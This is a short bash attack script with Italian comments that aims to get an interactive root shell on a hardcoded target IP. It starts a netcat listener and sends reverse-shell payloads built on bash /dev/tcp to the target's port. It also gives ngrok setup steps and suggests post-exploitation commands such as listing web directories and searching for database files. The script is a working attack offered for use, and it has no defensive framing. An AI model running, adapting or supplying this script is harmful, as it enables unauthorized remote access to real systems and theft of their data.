#!/bin/bash
# 🔥 ROOT SHELL - FIX nc port + Interactive UI

# IP auto + PORT fisso
MY_IP=$(curl -s --connect-timeout 5 ifconfig.me 2>/dev/null || echo "USE_NGROK")
PORT=4444
TARGET_IP="63.164.100.214"
TARGET_PORT=9091

clear
echo "🔥 ROOT INTERACTIVE SHELL"
echo "=========================="
echo "Target: $TARGET_IP:$TARGET_PORT"
echo "Listener: *:4444"

if [[ "$MY_IP" == "USE_NGROK" ]]; then
    echo "❌ No IP pubblico. Installa ngrok:"
    echo "curl -sL https://ngrok-agent.s3.amazonaws.com/ngrok.asc | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc"
    echo "echo 'deb https://ngrok-agent.s3.amazonaws.com buster main' | sudo tee /etc/apt/sources.list.d/ngrok.list"
    echo "sudo apt update && sudo apt install ngrok"
    exit 1
fi

echo "IP trovato: $MY_IP"
echo ""

# 1. LISTENER con PORT ESPLICITO
echo "🎧 Avvio nc -lvnp $PORT..."
nc -lvnp $PORT &
LISTENER_PID=$!
sleep 3

# 2. SHELL INTERATTIVA SEMPLICE
echo -e "\n📤 INVIO INTERACTIVE SHELL...\n"
(
    echo "bash -c \"exec 5<>/dev/tcp/$MY_IP/$PORT;cat <&5 | while read line; do \\\$line 2>&5 >&5; done\""
) | nc -w10 $TARGET_IP $TARGET_PORT

# Alternative
sleep 1
echo "sh -i >& /dev/tcp/$MY_IP/$PORT 0>&1" | nc -w5 $TARGET_IP $TARGET_PORT

# 3. ATTESA CON UI
echo -e "\n🎯 SHELL PRONTA!"
echo "═══════════════════════"
echo "whoami"
echo "id" 
echo "uname -a"
echo "ls -la /var/www/"
echo "find / -name '*.db' 2>/dev/null"
echo "═══════════════════════"

wait $LISTENER_PID
